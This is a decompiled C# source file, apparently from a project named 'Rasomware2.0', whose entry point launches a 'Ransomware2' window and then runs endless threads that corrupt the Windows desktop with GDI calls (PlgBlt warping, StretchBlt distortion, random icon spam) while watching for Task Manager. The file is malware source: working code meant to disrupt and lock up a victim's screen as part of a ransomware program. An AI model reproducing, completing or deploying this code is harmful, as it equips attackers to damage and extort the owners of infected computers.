using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Rasomware2._0;

namespace ns0;

internal class Class1
{
	private struct Struct0
	{
		public int int_0;

		public int int_1;
	}

	private static int int_0 = GetSystemMetrics(0);

	private static int int_1 = GetSystemMetrics(1);

	private static readonly Class4 class4_0 = new Class4();

	[DllImport("gdi32")]
	private static extern IntPtr CreateDC(string string_0, string string_1, string string_2, string string_3);

	[DllImport("user32")]
	private static extern int GetSystemMetrics(int int_2);

	[DllImport("gdi32.dll")]
	private static extern bool StretchBlt(IntPtr intptr_0, int int_2, int int_3, int int_4, int int_5, IntPtr intptr_1, int int_6, int int_7, int int_8, int int_9, int int_10);

	[DllImport("user32.dll")]
	private static extern IntPtr LoadIcon(IntPtr intptr_0, int int_2);

	[DllImport("user32.dll")]
	private static extern bool DrawIcon(IntPtr intptr_0, int int_2, int int_3, IntPtr intptr_1);

	[DllImport("gdi32.dll")]
	private static extern bool PlgBlt(IntPtr intptr_0, Struct0[] struct0_0, IntPtr intptr_1, int int_2, int int_3, int int_4, int int_5, IntPtr intptr_2, int int_6, int int_7);

	[DllImport("user32")]
	private static extern bool GetCursorPos(out Struct0 struct0_0);

	private static void smethod_0()
	{
		while (true)
		{
			for (int i = 0; i < 100; i++)
			{
				IntPtr intPtr = CreateDC("DISPLAY", null, null, null);
				Struct0 @struct = default(Struct0);
				@struct.int_0 = 0;
				@struct.int_1 = int_1 - i;
				Struct0 struct2 = @struct;
				@struct = default(Struct0);
				@struct.int_0 = i;
				@struct.int_1 = 0;
				Struct0 struct3 = @struct;
				@struct = default(Struct0);
				@struct.int_0 = int_0 - i;
				@struct.int_1 = int_1;
				Struct0 struct4 = @struct;
				PlgBlt(intPtr, new Struct0[3] { struct2, struct3, struct4 }, intPtr, 0, 0, int_0, int_1, IntPtr.Zero, 0, 0);
			}
		}
	}

	private static void smethod_1()
	{
		while (true)
		{
			Random random = new Random();
			IntPtr intptr_ = CreateDC("DISPLAY", null, null, null);
			IntPtr intptr_2 = LoadIcon(IntPtr.Zero, random.Next(32512, 32518));
			DrawIcon(intptr_, random.Next(0, int_0), random.Next(0, int_1), intptr_2);
		}
	}

	private static void smethod_2()
	{
		while (true)
		{
			IntPtr intPtr = CreateDC("DISPLAY", null, null, null);
			Random random = new Random();
			int int_ = random.Next(0, int_0);
			int int_2 = random.Next(0, int_1);
			int int_3 = random.Next(0, int_0);
			int int_4 = random.Next(0, int_1);
			int int_5 = random.Next(0, int_0);
			int int_6 = random.Next(0, int_1);
			int int_7 = random.Next(0, int_0);
			int int_8 = random.Next(0, int_1);
			StretchBlt(intPtr, int_, int_2, int_5, int_6, intPtr, int_3, int_4, int_7, int_8, 6684742);
		}
	}

	[STAThread]
	private static void Main()
	{
		class4_0.method_0();
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new Ransomware2());
		Thread.Sleep(2000);
		Thread thread = new Thread(smethod_0);
		Thread thread2 = new Thread(smethod_2);
		Thread thread3 = new Thread(smethod_1);
		thread.Start();
		thread2.Start();
		thread3.Start();
		while (true)
		{
			Process[] processesByName = Process.GetProcessesByName("taskmgr");
			if (processesByName.Length != 0)
			{
				Process.GetCurrentProcess().Kill();
			}
		}
	}
}
